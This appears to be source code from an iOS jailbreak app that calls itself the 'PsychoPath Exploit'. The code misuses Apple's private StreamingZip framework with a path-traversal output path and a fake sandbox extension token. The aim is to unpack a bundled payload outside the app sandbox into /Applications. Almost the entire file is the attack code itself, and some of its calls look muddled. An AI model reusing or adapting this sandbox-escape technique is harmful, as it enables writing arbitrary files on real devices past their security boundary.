//
//  ViewController.m
//  amfetamine
//
//  Created by Sem Voigtländer on 19/11/2017.
//  Copyright © 2017 Sem Voigtländer. All rights reserved.
//

#import "ViewController.h"
#include <stdio.h>
#include <stdlib.h>

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *exploit;
- (IBAction)doExploit:(id)sender;
@property int attempts;
@property long long sandboxToken;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.attempts = 0;
    // Do any additional setup after loading the view, typically from a nib.
    printf("=== PsychoPath Exploit ====\n");
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


- (IBAction)doExploit:(id)sender {
    printf("Welcome, starting exploit..\n");
    
    /* For iOS 10.3.2 and below use triple_fetch to escape sandbox and patch amfid */
    /* (...) */
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setEnabled:false];
        [_exploit setTitle:@"Starting..." forState:UIControlStateDisabled];
    });
    
    /* Load the private framework */
    NSBundle *unzipPrivateBundle = [NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StreamingZip.framework"];
    BOOL success = [unzipPrivateBundle load];
    if(success) {
        printf("Loaded private framework...\n");
        dispatch_async(dispatch_get_main_queue(), ^(void){
            [_exploit setTitle:@"Setting up" forState:UIControlStateDisabled];
        });
        printf("Setting up symbols...\n");
        Class SZExtractor = NSClassFromString(@"SZExtractor");
        Class StreamingUnzipper = NSClassFromString(@"StreamingUnzipper");
        printf("Created an StreamingUnzipper: %p\n",(void*)CFBridgingRetain(StreamingUnzipper));
        printf("Created an SZExtractor: %p\n",(void*)CFBridgingRetain(SZExtractor));
        printf("Setting our unsandboxed path\n");
        //id sandboxToken = ;
        //NSLog(@"%@", buffer);
        NSString* zipfile = [[NSBundle mainBundle] pathForResource:@"Payload" ofType:@"zip"];
        NSData *payload = [NSData dataWithContentsOfFile:zipfile];
        [SZExtractor enableDebugLogging];
        id delegate = [[SZExtractor alloc] valueForKey:@"delegate"];
        [delegate enableDebugLogging];
        printf("Allocated an SZExtractorDelegate to SZExtractor\n");
        [[delegate alloc] initForLocalExtractionWithPath:@"/tmp" options:nil];
        [[delegate alloc] supplyBytes:payload withCompletionBlock:^(void){
            printf("Done!");
        }];
        printf("Adding a StreamingUnzipper to the SZExtractor\n");
        id inProcessUnzipper = [[SZExtractor alloc] valueForKey:@"_inProcessUnzipper"];
        inProcessUnzipper = [StreamingUnzipper alloc];
        [inProcessUnzipper supplyBytes:payload withReply:^(void){
            printf("Unzipping stuff to /tmp\n");
        }];
        [inProcessUnzipper setupUnzipperWithOutputPath:@"/private/var/mobile/Media/DCIM/../../../../../tmp" sandboxExtensionToken:"12345670" options:nil withReply:nil];
        printf("Extracting payload..\n");
        dispatch_async(dispatch_get_main_queue(), ^(void){
            [_exploit setTitle:@"Extracting payload" forState:UIControlStateDisabled];
        });
        
        /* Give the extraction some time (10 seconds), if the app's still not in /Applications the extraction failed and thus the exploit */
        printf("Waiting until extraction is complete...\n");
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if(![[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Saigon.app/Saigon"]) {
                printf("Extraction timeout exceeded. Exploit failed :( \n");
                dispatch_async(dispatch_get_main_queue(), ^(void){
                    [_exploit setEnabled:true];
                    [_exploit setTitle:@"failed, retry" forState:UIControlStateNormal];
                    self.attempts++;
                    if(_attempts > 4) {
                        [_exploit setTitle:@"Probs don't work" forState:UIControlStateNormal];
                    }
                });
            } else {
                [_exploit setTitle:@"Done, please wait" forState:UIControlStateDisabled];
                [NSThread detachNewThreadWithBlock:^(void){
                    //Respring bug must be entered here as we need the icon to appear on the homescreen
                }];
            }
        });
    } else {
        dispatch_async(dispatch_get_main_queue(), ^(void){
            [_exploit setTitle:@"PFW not found :(" forState:UIControlStateDisabled];
        });
        return;
    }
    
    
    
}

/* Used to enable verbose */
- (void)enableDebugLogging {
    
}

/* Needed to make the selectors work */
- (void)initForLocalExtractionWithPath:(id)arg1 options:(id)arg2 {
    printf("Did something\n");
    return;
}
- (void)setupUnzipperWithOutputPath:(id)arg1 sandboxExtensionToken:(char *)arg2 options:(id)arg3 withReply:(id)arg4 {
    printf("Did something\n");
    return;
}

- (void)supplyBytes:(id)arg1 withReply:(id /* block */)arg2 {
    printf("Did something\n");
}
- (void)supplyBytes:(id)arg1 withCompletionBlock:(id /* block */)arg2 {
    printf("Did something\n");
}
@end

